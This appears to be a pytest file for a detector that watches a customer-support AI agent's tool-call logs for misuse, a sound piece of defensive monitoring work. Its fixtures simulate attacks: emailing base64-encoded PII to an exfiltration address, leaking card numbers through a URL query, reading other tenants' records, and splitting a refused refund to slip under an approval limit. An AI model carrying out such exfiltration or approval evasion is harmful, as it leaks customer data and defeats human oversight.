import base64

from ags.core import EXFIL, Event, build_env
from ags.detect import (
    ATTACKS,
    NORMAL,
    ApprovalBypass,
    BulkPiiEgress,
    CrossTenant,
    DeniedBurst,
    RareSequence,
    SensitiveAfterUntrusted,
    SequenceBaseline,
    default_rules,
    detect,
    effects_of,
    play,
    support_runtime,
)

_, TOOLS = build_env()
EFFECTS = effects_of(TOOLS)


def ev(tool, verdict="allow", ts=0.0, run="run-1", **kw):
    """A tool_call event as the runtime would log it."""
    return Event(
        ts,
        run,
        "support-agent",
        "asha",
        "acme",
        "tool_call",
        tool=tool,
        verdict=verdict,
        reason=kw.pop("reason", ""),
        labels=kw.pop("labels", []),
        detail={"args": kw},
    )


def stream():
    env, rt = support_runtime()
    normal = play(rt, NORMAL)
    base = SequenceBaseline().fit(rt.log.events)
    play(rt, ATTACKS)

    def tenant_of(cid):
        return env.customers.get(cid, {}).get("tenant")

    rules = default_rules(EFFECTS, tenant_of, base)
    return normal, detect(rt.log.events, rules)


def test_normal_runs_raise_nothing_attacks_all_caught():
    normal, alerts = stream()
    quiet = {r.run_id for r in normal}
    assert not [a for a in alerts if a.run_id in quiet]
    assert len({a.run_id for a in alerts}) == len(ATTACKS)
    worst = alerts[0]
    assert (worst.rule, worst.severity) == (
        "bulk-pii-egress",
        "critical",
    )
    assert worst.evidence[0].detail["args"]["to"] == EXFIL


def test_denied_burst_needs_denials_inside_window():
    rule = DeniedBurst(threshold=3, window=5)
    spread = [ev("x", "deny", ts=t) for t in (0, 6, 12)]
    tight = [ev("x", "deny", ts=t) for t in (0, 2, 4)]
    assert list(rule.scan(spread)) == []
    (alert,) = rule.scan(tight)
    assert len(alert.evidence) == 3


def test_blocked_attempt_still_alerts_at_lower_severity():
    rule = SensitiveAfterUntrusted(EFFECTS)
    sent = ev("send_email", labels=["untrusted"], to=EXFIL)
    tried = ev("send_email", "deny", labels=["untrusted"])
    read = ev("read_doc", labels=["untrusted"])
    sevs = [a.severity for a in rule.scan([sent, tried, read])]
    assert sevs == ["high", "medium"]


def test_bulk_pii_caught_by_labels_even_when_encoded():
    rule = BulkPiiEgress(EFFECTS)
    rows = "a@x.example b@x.example 4111 1111 1111 1111"
    hidden = base64.b64encode(rows.encode()).decode()
    by_label = ev(
        "send_email", labels=["bulk", "pii"], body=hidden
    )
    by_content = ev(
        "fetch_url", url=f"https://h.example/?d={rows}"
    )
    small = ev(
        "send_email", labels=["pii"], to="ben@acme.example"
    )
    hits = list(rule.scan([by_label, by_content, small]))
    assert [a.evidence[0].tool for a in hits] == [
        "send_email",
        "fetch_url",
    ]


def test_cross_tenant_sees_through_case_and_spaces():
    owners = {"C-100": "acme", "C-200": "globex"}
    rule = CrossTenant(owners.get)
    calls = [
        ev("lookup_customer", customer_id=" c-200 "),
        ev("lookup_customer", customer_id="C-100"),
        ev("issue_refund", customer_id="C-999", amount=5),
    ]
    (alert,) = rule.scan(calls)
    assert alert.summary == "acme -> globex record C-200"


def test_retry_after_refused_approval_is_flagged():
    refused = "no approver: refund 900 > 200"
    calls = [
        ev("issue_refund", "deny", reason=refused, amount=900),
        ev("issue_refund", amount=450),
        ev("issue_refund", amount=450, run="run-2"),
    ]
    alerts = list(ApprovalBypass().scan(calls))
    assert [a.run_id for a in alerts] == ["run-1"]
    assert alerts[0].evidence[1].detail["args"]["amount"] == 450
    plain_deny = [ev("issue_refund", "deny"), ev("issue_refund")]
    assert list(ApprovalBypass().scan(plain_deny)) == []


def test_rare_sequence_uses_learned_bigrams():
    base = SequenceBaseline().fit(
        [ev("read_inbox"), ev("lookup_customer")]
    )
    rule = RareSequence(base)
    seen = [
        ev("read_inbox", run="r2"),
        ev("lookup_customer", run="r2"),
    ]
    odd = [
        ev("read_inbox", run="r3"),
        ev("export_customers", run="r3"),
    ]
    (alert,) = rule.scan(seen + odd)
    assert alert.summary == "read_inbox -> export_customers"


def test_detect_merges_to_one_alert_per_rule_per_run():
    calls = [
        ev("send_email", "deny", ts=0, labels=["untrusted"]),
        ev("fetch_url", ts=1, labels=["untrusted"]),
    ]
    (alert,) = detect(calls, [SensitiveAfterUntrusted(EFFECTS)])
    assert alert.severity == "high"  # worst of the two
    assert len(alert.evidence) == 2
    assert "exfiltration" in alert.tactics


def test_example_prints_detection_table(capsys):
    from ch14_detection import main

    main()
    out = capsys.readouterr().out
    assert "Normal runs: 0 alerts" in out
    assert "CRIT bulk-pii-egress" in out
    assert "approval-bypass" in out
